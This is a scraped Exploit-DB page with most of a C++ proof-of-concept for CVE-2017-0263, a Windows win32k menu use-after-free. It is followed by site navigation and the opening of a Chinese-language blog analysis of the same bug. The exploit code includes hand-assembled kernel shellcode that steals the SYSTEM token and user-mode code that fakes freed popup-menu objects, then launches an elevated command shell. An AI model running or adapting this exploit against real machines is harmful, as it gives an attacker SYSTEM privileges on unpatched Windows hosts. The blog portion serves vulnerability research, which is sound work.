    // Judge if the `msg` is 0x9f9f value.
    0x55,                               // push    ebp
    0x8b, 0xec,                         // mov     ebp,esp
    0x8b, 0x45, 0x0c,                   // mov     eax,dword ptr [ebp+0Ch]
    0x3d, 0x9f, 0x9f, 0x00, 0x00,       // cmp     eax,9F9Fh
    0x0f, 0x85, 0x8d, 0x00, 0x00, 0x00, // jne     Loader+0x1128
    // Loader+0x109b:
    // Judge if CS is 0x1b, which means in user-mode context.
    0x66, 0x8c, 0xc8,                   // mov     ax,cs
    0x66, 0x83, 0xf8, 0x1b,             // cmp     ax,1Bh
    0x0f, 0x84, 0x80, 0x00, 0x00, 0x00, // je      Loader+0x1128
    // Loader+0x10a8:
    // Get the address of pwndWindowHunt to ECX.
    // Recover the flags of pwndWindowHunt: zero bServerSideWindowProc.
    // Get the address of pvShellCode to EDX by CALL-POP.
    // Get the address of pvShellCode->tagCLS[0x100] to ESI.
    // Get the address of popupMenuRoot to EDI.
    0xfc,                               // cld
    0x8b, 0x4d, 0x08,                   // mov     ecx,dword ptr [ebp+8]
    0xff, 0x41, 0x16,                   // inc     dword ptr [ecx+16h]
    0x60,                               // pushad
    0xe8, 0x00, 0x00, 0x00, 0x00,       // call    $5
    0x5a,                               // pop     edx
    0x81, 0xea, 0x43, 0x04, 0x00, 0x00, // sub     edx,443h
    0xbb, 0x00, 0x01, 0x00, 0x00,       // mov     ebx,100h
    0x8d, 0x72, 0x18,                   // lea     esi,[edx+18h]
    0x8b, 0x7d, 0x10,                   // mov     edi,dword ptr [ebp+10h]
    // Loader+0x10c7:
    0x85, 0xdb,                         // test    ebx,ebx
    0x74, 0x13,                         // je      Loader+0x10de
    // Loader+0x10cb:
    // Judge if pvShellCode->tagCLS[ebx] == NULL
    0xad,                               // lods    dword ptr [esi]
    0x4b,                               // dec     ebx
    0x83, 0xf8, 0x00,                   // cmp     eax,0
    0x74, 0xf5,                         // je      Loader+0x10c7
    // Loader+0x10d2:
    // Judge if tagCLS->lpszMenuName == popupMenuRoot
    0x03, 0x42, 0x08,                   // add     eax,dword ptr [edx+8]
    0x39, 0x38,                         // cmp     dword ptr [eax],edi
    0x75, 0xee,                         // jne     Loader+0x10c7
    // Loader+0x10d9:
    // Zero tagCLS->lpszMenuName
    0x83, 0x20, 0x00,                   // and     dword ptr [eax],0
    0xeb, 0xe9,                         // jmp     Loader+0x10c7
    // Loader+0x10de:
    // Get the value of pwndWindowHunt->head.pti->ppi->Process to ECX.
    // Get the value of pvShellCode->pid to EAX.
    0x8b, 0x49, 0x08,                   // mov     ecx,dword ptr [ecx+8]
    0x8b, 0x5a, 0x0c,                   // mov     ebx,dword ptr [edx+0Ch]
    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
    0x8b, 0x09,                         // mov     ecx,dword ptr [ecx]
    0x8b, 0x5a, 0x10,                   // mov     ebx,dword ptr [edx+10h]
    0x8b, 0x42, 0x04,                   // mov     eax,dword ptr [edx+4]
    0x51,                               // push    ecx
    // Loader+0x10f0:
    // Judge if EPROCESS->UniqueId == pid.
    0x39, 0x44, 0x0b, 0xfc,             // cmp     dword ptr [ebx+ecx-4],eax
    0x74, 0x07,                         // je      Loader+0x10fd
    // Loader+0x10f6:
    // Get next EPROCESS to ECX by ActiveLink.
    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
    0x2b, 0xcb,                         // sub     ecx,ebx
    0xeb, 0xf3,                         // jmp     Loader+0x10f0
    // Loader+0x10fd:
    // Get current EPROCESS to EDI.
    0x8b, 0xf9,                         // mov     edi,ecx
    0x59,                               // pop     ecx
    // Loader+0x1100:
    // Judge if EPROCESS->UniqueId == 4
    0x83, 0x7c, 0x0b, 0xfc, 0x04,       // cmp     dword ptr [ebx+ecx-4],4
    0x74, 0x07,                         // je      Loader+0x110e
    // Loader+0x1107:
    // Get next EPROCESS to ECX by ActiveLink.
    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
    0x2b, 0xcb,                         // sub     ecx,ebx
    0xeb, 0xf2,                         // jmp     Loader+0x1100
    // Loader+0x110e:
    // Get system EPROCESS to ESI.
    // Get the value of system EPROCESS->Token to current EPROCESS->Token.
    // Add 2 to OBJECT_HEADER->PointerCount of system Token.
    // Return 0x9F9F to the caller.
    0x8b, 0xf1,                         // mov     esi,ecx
    0x8b, 0x42, 0x14,                   // mov     eax,dword ptr [edx+14h]
    0x03, 0xf0,                         // add     esi,eax
    0x03, 0xf8,                         // add     edi,eax
    0xad,                               // lods    dword ptr [esi]
    0xab,                               // stos    dword ptr es:[edi]
    0x83, 0xe0, 0xf8,                   // and     eax,0FFFFFFF8h
    0x83, 0x40, 0xe8, 0x02,             // add     dword ptr [eax-18h],2
    0x61,                               // popad
    0xb8, 0x9f, 0x9f, 0x00, 0x00,       // mov     eax,9F9Fh
    0xeb, 0x05,                         // jmp     Loader+0x112d
    // Loader+0x1128:
    // Failed in processing.
    0xb8, 0x01, 0x00, 0x00, 0x00,       // mov     eax,1
    // Loader+0x112d:
    0xc9,                               // leave
    0xc2, 0x10, 0x00,                   // ret     10h
};

static
VOID
xxGetHMValidateHandle(VOID)
{
    HMODULE hModule = LoadLibraryA("USER32.DLL");
    PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, "IsMenu");
    PBYTE Address = NULL;
    for (INT i = 0; i < 0x30; i++)
    {
        if (*(WORD *)(i + pfnIsMenu) != 0x02B2)
        {
            continue;
        }
        i += 2;
        if (*(BYTE *)(i + pfnIsMenu) != 0xE8)
        {
            continue;
        }
        Address = *(DWORD *)(i + pfnIsMenu + 1) + pfnIsMenu;
        Address = Address + i + 5;
        pfnHMValidateHandle = (PVOID(__fastcall *)(HANDLE, BYTE))Address;
        break;
    }
}

#define TYPE_WINDOW 1

static
PVOID
xxHMValidateHandleEx(HWND hwnd)
{
    return pfnHMValidateHandle((HANDLE)hwnd, TYPE_WINDOW);
}

static
PVOID
xxHMValidateHandle(HWND hwnd)
{
    PVOID RetAddr = NULL;
    if (!pfnHMValidateHandle)
    {
        xxGetHMValidateHandle();
    }
    if (pfnHMValidateHandle)
    {
        RetAddr = xxHMValidateHandleEx(hwnd);
    }
    return RetAddr;
}

static
ULONG_PTR
xxSyscall(UINT num, ULONG_PTR param1, ULONG_PTR param2)
{
    __asm { mov eax, num };
    __asm { int 2eh };
}

static
LRESULT
WINAPI
xxShadowWindowProc(
    _In_ HWND   hwnd,
    _In_ UINT   msg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    if (msg != WM_NCDESTROY || bDoneExploit)
    {
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    std::cout << "::" << __FUNCTION__ << std::endl;
    POCDEBUG_BREAK();
    DWORD dwPopupFake[0xD] = { 0 };
    dwPopupFake[0x0] = (DWORD)0x00098208;  //->flags
    dwPopupFake[0x1] = (DWORD)pvHeadFake;  //->spwndNotify
    dwPopupFake[0x2] = (DWORD)pvHeadFake;  //->spwndPopupMenu
    dwPopupFake[0x3] = (DWORD)pvHeadFake;  //->spwndNextPopup
    dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup
    dwPopupFake[0x5] = (DWORD)pvHeadFake;  //->spmenu
    dwPopupFake[0x6] = (DWORD)pvHeadFake;  //->spmenuAlternate
    dwPopupFake[0x7] = (DWORD)pvHeadFake;  //->spwndActivePopup
    dwPopupFake[0x8] = (DWORD)0xFFFFFFFF;  //->ppopupmenuRoot
    dwPopupFake[0x9] = (DWORD)pvHeadFake;  //->ppmDelayedFree
    dwPopupFake[0xA] = (DWORD)0xFFFFFFFF;  //->posSelectedItem
    dwPopupFake[0xB] = (DWORD)pvHeadFake;  //->posDropped
    dwPopupFake[0xC] = (DWORD)0;
    for (UINT i = 0; i < iWindowCount; ++i)
    {
        SetClassLongW(hWindowList[i], GCL_MENUNAME, (LONG)dwPopupFake);
    }
    xxSyscall(num_NtUserMNDragLeave, 0, 0);
    LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0);
    bDoneExploit = Triggered == 0x9F9F;
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

#define MENUCLASS_NAME L"#32768"

static
LRESULT
CALLBACK
xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
    tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
    static HWND hwndMenuHit = 0;
    static UINT iShadowCount = 0;

    if (bDoneExploit || iMenuCreated != num_PopupMenuCount - 2 || cwp->message != WM_NCCREATE)
    {
        return CallNextHookEx(0, code, wParam, lParam);
    }
    std::cout << "::" << __FUNCTION__ << std::endl;
    WCHAR szTemp[0x20] = { 0 };
    GetClassNameW(cwp->hwnd, szTemp, 0x14);
    if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)
    {
        std::cout << "::iShadowCount=" << iShadowCount << std::endl;
        POCDEBUG_BREAK();
        if (++iShadowCount == num_WndShadowCount)
        {
            SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
        }
        else
        {
            SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW);
            SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW);
        }
    }
    else if (!wcscmp(szTemp, MENUCLASS_NAME))
    {
        hwndMenuHit = cwp->hwnd;
        std::cout << "::hwndMenuHit=" << hwndMenuHit << std::endl;
    }
    return CallNextHookEx(0, code, wParam, lParam);
}

#define MN_ENDMENU 0x1F3

static
VOID
CALLBACK
xxWindowEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD         event,
    HWND          hwnd,
    LONG          idObject,
    LONG          idChild,
    DWORD         idEventThread,
    DWORD         dwmsEventTime
)
{
    UNREFERENCED_PARAMETER(hWinEventHook);
    UNREFERENCED_PARAMETER(event);
    UNREFERENCED_PARAMETER(idObject);
    UNREFERENCED_PARAMETER(idChild);
    UNREFERENCED_PARAMETER(idEventThread);
    UNREFERENCED_PARAMETER(dwmsEventTime);
    std::cout << "::" << __FUNCTION__ << std::endl;
    if (iMenuCreated == 0)
    {
        popupMenuRoot = *(DWORD *)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0);
    }
    if (++iMenuCreated >= num_PopupMenuCount)
    {
        std::cout << ">>SendMessage(MN_ENDMENU)" << std::endl;
        POCDEBUG_BREAK();
        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
    }
    else
    {
        std::cout << ">>SendMessage(WM_LBUTTONDOWN)" << std::endl;
        POCDEBUG_BREAK();
        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002);
    }
}

static
BOOL
xxRegisterWindowClassW(LPCWSTR lpszClassName, INT cbWndExtra)
{
    WNDCLASSEXW wndClass = { 0 };
    wndClass = { 0 };
    wndClass.cbSize = sizeof(WNDCLASSEXW);
    wndClass.lpfnWndProc    = DefWindowProcW;
    wndClass.cbWndExtra     = cbWndExtra;
    wndClass.hInstance      = GetModuleHandleA(NULL);
    wndClass.lpszMenuName   = NULL;
    wndClass.lpszClassName  = lpszClassName;
    return RegisterClassExW(&wndClass);
}

static
HWND
xxCreateWindowExW(LPCWSTR lpszClassName, DWORD dwExStyle, DWORD dwStyle)
{
    return CreateWindowExW(dwExStyle,
        lpszClassName,
        NULL,
        dwStyle,
        0,
        0,
        1,
        1,
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL);
}

static
VOID xxCreateCmdLineProcess(VOID)
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

static
DWORD
WINAPI
xxTrackExploitEx(LPVOID lpThreadParameter)
{
    UNREFERENCED_PARAMETER(lpThreadParameter);
    std::cout << "::" << __FUNCTION__ << std::endl;
    POCDEBUG_BREAK();

    for (INT i = 0; i < num_PopupMenuCount; i++)
    {
        MENUINFO mi = { 0 };
        hpopupMenu[i]  = CreatePopupMenu();
        mi.cbSize  = sizeof(mi);
        mi.fMask   = MIM_STYLE;
        mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;
        SetMenuInfo(hpopupMenu[i], &mi);
    }
    for (INT i = 0; i < num_PopupMenuCount; i++)
    {
        LPCSTR szMenuItem = "item";
        AppendMenuA(hpopupMenu[i],
            MF_BYPOSITION | MF_POPUP,
            (i >= num_PopupMenuCount - 1) ? 0 : (UINT_PTR)hpopupMenu[i + 1],
            szMenuItem);
    }

    for (INT i = 0; i < 0x100; i++)
    {
        WNDCLASSEXW Class = { 0 };
        WCHAR szTemp[20] = { 0 };
        HWND hwnd = NULL;
        wsprintfW(szTemp, L"%x-%d", rand(), i);
        Class.cbSize        = sizeof(WNDCLASSEXA);
        Class.lpfnWndProc   = DefWindowProcW;
        Class.cbWndExtra    = 0;
        Class.hInstance     = GetModuleHandleA(NULL);
        Class.lpszMenuName  = NULL;
        Class.lpszClassName = szTemp;
        if (!RegisterClassExW(&Class))
        {
            continue;
        }
        hwnd = CreateWindowExW(0, szTemp, NULL, WS_OVERLAPPED,
            0,
            0,
            0,
            0,
            NULL,
            NULL,
            GetModuleHandleA(NULL),
            NULL);
        if (hwnd == NULL)
        {
            continue;
        }
        hWindowList[iWindowCount++] = hwnd;
    }
    for (INT i = 0; i < iWindowCount; i++)
    {
        pvShellCode->tagCLS[i] = *(PVOID *)((PBYTE)xxHMValidateHandle(hWindowList[i]) + num_offset_WND_pcls);
    }

    DWORD fOldProtect = 0;
    VirtualProtect(pvShellCode, 0x1000, PAGE_EXECUTE_READ, &fOldProtect);

    xxRegisterWindowClassW(L"WNDCLASSMAIN", 0x000);
    hWindowMain = xxCreateWindowExW(L"WNDCLASSMAIN",
        WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
        WS_VISIBLE);
    xxRegisterWindowClassW(L"WNDCLASSHUNT", 0x200);
    hWindowHunt = xxCreateWindowExW(L"WNDCLASSHUNT",
        WS_EX_LEFT,
        WS_OVERLAPPED);
    PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hWindowHunt);
    PBYTE pbExtra = head->deskhead.pSelf + 0xb0 + 4;
    pvHeadFake = pbExtra + 0x44;
    for (UINT x = 0; x < 0x7F; x++)
    {
        SetWindowLongW(hWindowHunt, sizeof(DWORD) * (x + 1), (LONG)pbExtra);
    }
    PVOID pti = head->thread.pti;
    SetWindowLongW(hWindowHunt, 0x28, 0);
    SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti
    SetWindowLongW(hWindowHunt, 0x6C, 0);
    SetWindowLongW(hWindowHunt, 0x1F8, 0xC033C033);
    SetWindowLongW(hWindowHunt, 0x1FC, 0xFFFFFFFF);

    pvAddrFlags = *(PBYTE *)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;

    SetWindowLongW(hWindowHunt, GWL_WNDPROC, (LONG)pvShellCode->pfnWindProc);

    SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,
        GetModuleHandleA(NULL),
        GetCurrentThreadId());

    SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
        GetModuleHandleA(NULL),
        xxWindowEventProc,
        GetCurrentProcessId(),
        GetCurrentThreadId(),
        0);

    TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);

    MSG msg = { 0 };
    while (GetMessageW(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}

INT POC_CVE20170263(VOID)
{
    std::cout << "-------------------" << std::endl;
    std::cout << "POC - CVE-2017-0263" << std::endl;
    std::cout << "-------------------" << std::endl;

    pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pvShellCode == NULL)
    {
        return 0;
    }
    ZeroMemory(pvShellCode, 0x1000);
    pvShellCode->pid = GetCurrentProcessId();
    pvShellCode->off_CLS_lpszMenuName    = 0x050;
    pvShellCode->off_THREADINFO_ppi      = 0x0b8;
    pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
    pvShellCode->off_EPROCESS_Token      = 0x0f8;
    CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc));

    std::cout << "CREATE WORKER THREAD..." << std::endl;
    POCDEBUG_BREAK();
    HANDLE hThread = CreateThread(NULL, 0, xxTrackExploitEx, NULL, 0, NULL);
    if (hThread == NULL)
    {
        return FALSE;
    }
    while (!bDoneExploit)
    {
        Sleep(500);
    }
    xxCreateCmdLineProcess();
    DestroyWindow(hWindowMain);
    TerminateThread(hThread, 0);
    std::cout << "-------------------" << std::endl;
    getchar();
    return bDoneExploit;
}

INT main(INT argc, CHAR *argv[])
{
    POC_CVE20170263();
    return 0;
}

```

**Tags:**

[![](/screenshots/idlt44500/shot-thumb.png)](/screenshots/idlt44500/shot.png)

**Advisory/Source:**
[Link](https://github.com/leeqwind/HolicPOC/tree/d53ad7685759f8261f882a11fc7a0313a5e8bacb/windows/win32k/CVE-2017-0263/windows/win32k/CVE-2017-0263/x86.cpp)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from xiaodaozhi.com_5ff18882_20250126_091003.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

# 从 CVE-2017-0263 漏洞分析到 Windows 菜单管理组件

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)

[Leeqwind](https://xiaodaozhi.com/author/1/)

2018-04-10
阅读: 68475
评论: 18原载: 安全客

21

CVE-2017-0263 是 Windows 操作系统 `win32k` 内核模块菜单管理组件中的一个 UAF（释放后重用）漏洞，据报道称该漏洞在之前与一个 EPS 漏洞被 APT28 组织组合攻击用来干涉法国大选。这篇文章将对用于这次攻击的样本的 CVE-2017-0263 漏洞部分进行一次简单的分析，以整理出该漏洞利用的运作原理和基本思路，并对 Windows 窗口管理器子系统的菜单管理组件进行简单的探究。分析的环境是 Windows 7 x86 SP1 基础环境的虚拟机。

![]()

在本分析中为了突出分析的重点，在对涉及的各个系统函数进行分析时，将与当前漏洞研究无关的调用语句进行忽略，只留意影响或可能影响漏洞触发逻辑的调用和赋值语句并对其进行分析和解释。

## 0x0 前言

这篇文章分析了发生在窗口管理器（User）子系统的菜单管理组件中的 CVE-2017-0263 UAF（释放后重用）漏洞。在函数 `win32k!xxxMNEndMenuState` 中释放全局菜单状态对象的成员域 `pGlobalPopupMenu` 指向的根弹出菜单对象时，没有将该成员域置零，导致该成员域仍旧指向已被释放的内存区域成为野指针，在后续的代码逻辑中存在该成员域指向的内存被读写访问或被重复释放的可能性。

在释放成员域 `pGlobalPopupMenu` 指向对象之后，函数 `xxxMNEndMenuState` 还将当前线程关联的线程信息对象成员域 `pMenuState` 重置，这导致大部分追踪和操作弹出菜单的接口将无法达成漏洞触发的条件。但在重置成员域 `pMenuState` 之前，函数中存在对全局菜单状态对象的成员域 `uButtonDownHitArea` 的解锁和释放，这个成员域存储当前鼠标按下位置所属的窗口对象（如果当前存在鼠标按下状态）指针。

如果用户进程先前通过利用技巧构造了特殊关联和属性的菜单窗口对象，那么从函数 `xxxMNEndMenuState` 释放成员域 `pGlobalPopupMenu` 到重置成员域 `pMenuState` 之前的这段时间，执行流将回到用户进程中，用户进程中构造的利用代码将有足够的能力改变当前弹出菜单的状态，致使执行流重新执行 `xxxMNEndMenuState` 函数，并对根弹出菜单对象的内存进行重复释放，导致系统 BSOD 的发生。

在内核第一次释放成员域 `pGlobalPopupMenu` 指向内存之后执行流回到用户进程时，在用户进程中通过巧妙的内存布局，使系统重新分配相同大小的内存区域以占用成员域 `pGlobalPopupMenu` 指向的先前释放的内存块，伪造新的弹出菜单对象并构造相关成员域。借助代码逻辑，实现对特定窗口对象的成员标志位 `bServerSideWindowProc` 的修改，使系统能够在内核中直接执行位于用户进程地址空间中的自定义窗口消息处理函数，得以通过内核上下文执行用户进程构造的利用代码，实现内核提权的目的。

## 0x1 原理

CVE-2017-0263 漏洞存在于 `win32k` 的窗口管理器（User）子系统中的菜单管理组件中。在内核函数 `xxxMNEndMenuState` 释放目标 `tagMENUSTATE` 结构体对象的成员域 `pGlobalPopupMenu`  指向对象的内存时，没有将该成员域置为空值。

在 `win32k` 模块中存在定义为 `tagMENUSTATE` 结构体类型的菜单状态 `gMenuState` 全局对象。在当前的操作系统环境下，该结构体的定义如下：

```
kd> dt win32k!tagMENUSTATE
   +0x000 pGlobalPopupMenu : Ptr32 tagPOPUPMENU
   +0x004 flags            : Int4B
   +0x008 ptMouseLast      : tagPOINT
   +0x010 mnFocus          : Int4B
   +0x014 cmdLast          : Int4B
   +0x018 ptiMenuStateOwner : Ptr32 tagTHREADINFO
   +0x01c dwLockCount      : Uint4B
   +0x020 pmnsPrev         : Ptr32 tagMENUSTATE
   +0x024 ptButtonDown     : tagPOINT
   +0x02c uButtonDownHitArea : Uint4B
   +0x030 uButtonDownIndex : Uint4B
